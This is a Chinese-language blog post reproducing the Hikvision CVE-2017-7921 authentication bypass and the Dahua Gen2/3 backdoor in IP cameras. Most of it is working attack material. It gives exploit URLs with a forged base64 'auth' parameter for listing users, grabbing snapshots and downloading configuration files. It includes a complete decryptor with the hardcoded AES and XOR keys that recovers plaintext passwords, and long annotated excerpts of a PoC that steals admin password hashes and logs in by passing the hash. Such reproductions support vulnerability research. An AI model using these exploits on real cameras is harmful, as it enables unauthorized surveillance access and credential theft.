## 一、概述

 **CVE-2017-7921**  
主要可参考seclist的[这个](https://seclists.org/fulldisclosure/2017/Sep/23)链接。

    
    
    Vulnerability details:
    ----------------------    Hikvision camera API includes support for proprietary HikCGI protocol, which exposes URI endpoints through the camera's 
    web interface. The HikCGI protocol handler checks for the presence of a parameter named "auth" in the query string and 
    if that parameter contains a base64-encoded "username:password" string, the HikCGI API call assumes the idntity of the 
    specified user. The password is ignored.
    翻译：
    海康威视摄像头的API中包括了对私有的HikCGI协议的支持，这也将URI结点通过摄像头的网络界面暴露了出来。HikCGI的协议处理器会在查询字串中检索参数'auth'，如果该参数包括有base64编码的"username:password"字符串，HikCGI API就会假设调用者为合法使用者。密码则被忽略了。
    

****大华Gen2/3后门漏洞****  
根据github上贴出的[攻击脚本](https://github.com/mcw0/PoC/blob/master/dahua-backdoor-PoC.py)描述，该漏洞由国外安全研究人员mcw0于2017年3月20日发现。  
该漏洞可以使攻击者：  
 **1.远程下载含所有权限用户凭证的完整数据库；**  
2.选择任一管理员用户，拷贝用户名与密码哈希；  
3.使用它们来远程登录到海康威视/大华设备。

## 二、漏洞复现

###  **CVE-2017-7921：**

 **简单版**

 **具体表现为如下三个特定url:**  
IP/Security/users?auth=YWRtaW46MTEK  
 **检索所有用户及其角色的列表**  
IP/onvif-http/snapshot?auth=YWRtaW46MTEK  
 **获取相机快照而不进行身份验证**  
IP/System/configurationFile?auth=YWRtaW46MTEK  
 **下载摄像头配置账号密码文件**

YWRtaW46MTEK：admin:11的base64编码  
onvif-http/snapshot：协议截图指令

 **复杂版(获取登录口令或直接登录)**

第三个url可以下载到含账户和密码的配置文件(当然是加密的)。  
可以通过 **解密下载得到的配置文件** 直接获取摄像头的 **明文登录账号与密码** ，实现完全控制。  
这里是git上的[解密脚本](https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor)

    
    
    #!/usr/bin/python3
    
    from itertools import cycle
    from Crypto.Cipher import AES
    import re
    import os
    import sys
    
    #补足密文为16的倍数
    def add_to_16(s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 
    
    #AES解密，密文是下载的configurationFile文件，密钥为固定值279977f62f6cfd2d91cd75b889ce0c9a
    #固定密钥+AES......被锤烂不意外
    #注意那个iv 因为这里使用的是ECB模式所以根本不需要iv.....估计是赶工没写CBC,不然这开头的iv要它何用
    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = add_to_16(ciphertext)
        #iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")
    
    #解密完了的明文还需要挨个异或0x73, 0x8B, 0x55, 0x44的循环才能得到最终明文
    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))
    
    def strings(file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)
    
    def main():
        if len(sys.argv) <= 1 or not os.path.isfile(sys.argv[1]):
            return print(f'No valid config file provided to decrypt. For example:\n{sys.argv[0]} <configfile>')
        xor = xore( decrypt(open( sys.argv[1],'rb').read()) )
        result_list = strings(xor.decode('ISO-8859-1'))
        print(result_list)
    
    if __name__ == '__main__':
        main()
    

解密得到的明文如下所示。  
![image](https://image.3001.net/images/20220327/1648387929_62406759be3b9cc9ea579.png!small)  
画线部分即为明文账户密码。

### 大华Gen2/3后门漏洞

根据描述，该漏洞允许用户不使用明文密码而是直接使用密码哈希登录。

 **账号与密码哈希的获取**

    
    
    try:
    		print "[>] Checking for backdoor version"
    		URI = "/current_config/passwd" #通过检测这个来获取账号和密码哈希
    		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
    		print "[!] Generation 2 found"
    		reponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen2(response,headers)
    	except urllib2.HTTPError as e:
    		#
    		# If not, try to find /current_config/Account1 user database (Generation 3)
    		#
    		if e.code == 404:
    			try:
    				URI = '/current_config/Account1' #G2与G3的文件不同
    				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
    				print "[!] Generation 3 Found"
    				response = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen3(response,headers)
    			except urllib2.HTTPError as e:
    				if e.code == 404:
    					print "[!] Patched or not Dahua device! ({})".format(e.code)
    					sys.exit(1)
    				else:
    					print "Error Code: {}".format(e.code)
    	except Exception as e:
    		print "[!] Detect of target failed ({})".format(e)
    		sys.exit(1)
    

获取的配置页面大致如下(Gen2)。  
![image](https://image.3001.net/images/20220401/1648809847_6246d77781d8b90247ac2.png!small)

 **直接使用哈希登录**  
作者在原文中也提到了，Gen2与Gen3使用的哈希登录方式不一致。

    
    
    #
    	# Generation 2
    	#
    	def Gen2(self,response,headers):
    		self.response = response
    		self.headers = headers
    
    		html = self.response.readlines()
    		if self.verbose:
    			for lines in html:
    				print "{}".format(lines)
    		#
    		# Check for first availible admin user
    		#实际上就是使用漏洞获取用户名与哈希
    		for line in html:
    			if line[0] == "#" or line[0] == "\n":
    				continue
    			line = line.split(':')[0:25]
    			if line[3] == '1':		# Check if user is in admin group 
    				USER_NAME = line[1]	# Save login name
    				PWDDB_HASH = line[2]# Save hash
    			#注意看上面的图 每一行格式为 用户名:密码哈希:权限代号 所以对应line数组的前三个
    				print "[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2])
    				break
    
    		#
    		# Login 1
    		#空密码 获取session id
    		print "[>] Requesting our session ID"
    		query_args = {"method":"global.login",
    			"params":{
    				"userName":USER_NAME,
    				"password":"",
    				"clientType":"Web3.0"},
    			"id":10000}
    
    		URI = '/RPC2_Login'
    		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
    
    		json_obj = json.load(response)
    		if self.verbose:
    			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
    
    		#
    		# Login 2
    		#使用RPC2_Login接口+账号+密码哈希+session登录
    		print "[>] Logging in"
    
    		query_args = {"method":"global.login",
    			"session":json_obj['session'],
    			"params":{
    				"userName":USER_NAME,
    				"password":PWDDB_HASH,
    				"clientType":"Web3.0",
    				"authorityType":"OldDigest"},
    			"id":10000}
    
    		URI = '/RPC2_Login'
    		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
    		print response.read()
    
    		#
    		# Wrong username/password
    		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1997483520 }
    		# { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1997734656 }
    		#
    		# Successfull login
    		# { "id" : 10000, "params" : null, "result" : true, "session" : 1626533888 }
    		# 
    
    		#
    		# Logout
    		#
    		print "[>] Logging out"
    		query_args = {"method":"global.logout",
    			"params":"null",
    			"session":json_obj['session'],
    			"id":10001}
    
    		URI = '/RPC2'
    		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
    		return response
    
    	#
    	# Generation 3
    	#
    	def Gen3(self,response,headers):
    		self.response = response
    		self.headers = headers
    
    		json_obj = commentjson.load(self.response)
    		if self.verbose:
    			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
    
    		#
    		# Check for first availible admin user
    		#可以看到Gen2与Gen3的配置文件格式不同 匹配时也不一样
    		for who in json_obj[json_obj.keys()[0]]:
    			if who['Group'] == 'admin':			# Check if user is in admin group
    				USER_NAME = who['Name']			# Save login name
    				PWDDB_HASH = who['Password']	# Save hash
    				print "[i] Choosing Admin Login: {}".format(who['Name'])
    				break
    		#
    		# Request login
    		#
    		print "[>] Requesting our session ID"
    		query_args = {"method":"global.login",
    			"params":{
    				"userName":USER_NAME,
    				"password":"",
    				"clientType":"Web3.0"},
    			"id":10000}
    
    		URI = '/RPC2_Login'
    		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
    
    		json_obj = json.load(response)
    		if self.verbose:
    			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
    		#
    		# Generate login MD5 hash with all required info we have downloaded
    		# 哈希方式发生了变化 加入了随机数 哈希改成由[用户名:随机数:密码哈希]md5运算得到
    		RANDOM = json_obj['params']['random']
    		PASS = ''+ USER_NAME +':' + RANDOM + ':' + PWDDB_HASH + ''
    		RANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()
    
    		print "[i] Downloaded MD5 hash:",PWDDB_HASH
    		print "[i] Random value to encrypt with:",RANDOM
    		print "[i] Built password:",PASS
    		print "[i] MD5 generated password:",RANDOM_HASH
    
    		#
    		# Login
    		#
    		print "[>] Logging in"
    
    		query_args = {"method":"global.login",
    			"session":json_obj['session'],
    			"params":{
    				"userName":USER_NAME,
    				"password":RANDOM_HASH,
    				"clientType":"Web3.0",
    				"authorityType":"Default"},
    			"id":10000}
    
    		URI = '/RPC2_Login'
    		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj['session'])
    		print response.read()
    
    		# Wrong username/password
    		# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1156538295 }
    		# { "error" : { "code" : 268632070, "message" : "Component error: user's name not valid!" }, "id" : 10000, "result" : false, "session" : 1175812023 }
    		#
    		# Successfull login
    		# { "id" : 10000, "params" : null, "result" : true, "session" : 1175746743 }
    		#
    
    		#
    		# Logout
    		#
    		print "[>] Logging out"
    		query_args = {"method":"global.logout",
    			"params":"null",
    			"session":json_obj['session'],
    			"id":10001}
    
    		URI = '/RPC2'
    		response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)
    		return response
    

登录数据包如下：  
![在这里插入图片描述](https://image.3001.net/images/20220327/1648387930_6240675a8e57eefaabc98.png!small)

原作者在POC里面也写了针对Gen1/2/3的哈希分析：

    
    
    # 3) Passing the hash
    # 3.1) Generation 1 - Base64 encoded (Not in this PoC, since I don't know what I want to request, but I could guess same format as 2.2)
    # 3.2) Generation 2 - No processing needed; only to pass on the hash
    # 3.3) Generation 3 - New 'improved' MD5 random hash must be generated with additional details, that we simply requesting from remote
    # 3.4) New MD5 random hash has to be generated as: <username>:<random>:[MD5 format as in user database (2.2)] 
    
    翻译：
    Gen1: base64加密 我没写是因为我构造不出来数据包qwq 但我猜跟其他的差不多qwq
    Gen2: 直接传哈希就行了
    Gen3: 新的“升级”MD5随机哈希 需要先请求得到随机数 再对 <用户名>:<随机数>:<密码哈希> 做MD5运算得到
    

## 三、挖洞经验

原作者分享了他的挖洞经验：

    
    
    # Researching by dissasembling of Dahuas main binaries 'Challenge' / 'Sonia'
    # What got me curios, was abnormally empty inside of the image I was initally checking, and of course the big binary 'Challenge'
    # What got me on track, was the lack of references to sensitive files
    # Missing user database and Config in the archives, only a unused and read-only /etc/passwd was found
    # Noticed that sensitive files was generated by the binary at startup
    # Noticed checkings after sensitive files in different directories, to use 'defaults' as last resource
    # Noticed the mix of intentionally public files and sensitive files in same directory
    # Reading of the .htm and .js that was found in the image
    # ...etc.
    
    翻译：
    研究主要依靠反汇编大华的主要固件 'Challenge' / 'Sonia'
    让我好奇的是固件镜像里面除了一个大号的可执行文件'Challenge'以外几乎是空的
    让我找到问题的是缺乏对敏感文件的引用
    镜像里面根本没有用户数据库和Config配置文件，只有一个没有使用的只读/etc/passwd文件
    注意到敏感文件是由可执行文件在开始运行时生成的 （被硬编码在可执行文件里面了/可以直接逆出生成算法）
    注意到检查完不同目录下的敏感文件后，使用default(默认)作为最后的资源
    注意到蓄意将公共文件和敏感文件放在一个目录下 (原作者认为这是大华故意留的后门 所以一直在POC里面diss大华)
    镜像里面没有.htm与.js文件 （所有校验都是可执行文件来做）
    等等
    

本来想找来固件手撕一下的，但是貌似官网统统下架了(有人说17年以前的固件全部清理了)  
将来有机会再整吧

## 四、参考链接

> [影响固件版本与POC](https://www.cnblogs.com/marrymair/p/14174879.html)  
> [exploit-db链接](https://www.exploit-db.com/exploits/44002)  
>
> [复现](https://blog.csdn.net/qq_41617034/article/details/117521734?utm_medium=distribute.pc_relevant.none-> task-> blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-> task-blog-2~default~CTRLIST~default-1.no_search_link)  
> [绿盟漏洞通报](http://blog.nsfocus.net/dahua-cameras-unauthorized-access-> vulnerability-technical-analysis-solution/)（图源）  
> [大华维基](http://dahuawiki.com)(官方固件下载)

